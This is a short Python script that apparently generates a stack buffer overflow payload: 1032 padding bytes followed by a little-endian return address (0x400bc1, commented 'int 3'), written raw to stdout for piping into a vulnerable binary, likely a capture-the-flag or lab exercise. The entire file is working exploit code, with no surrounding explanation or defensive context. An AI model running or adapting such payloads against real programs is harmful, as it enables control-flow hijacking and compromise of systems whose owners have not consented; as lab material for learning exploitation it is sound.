import sys

padding = b"A"*1032
exploit = b'\xc1\x0b\x40\x00\x00\x00\x00\x00' # (int 3)
exploit = padding + exploit

sys.stdout.buffer.write(exploit)
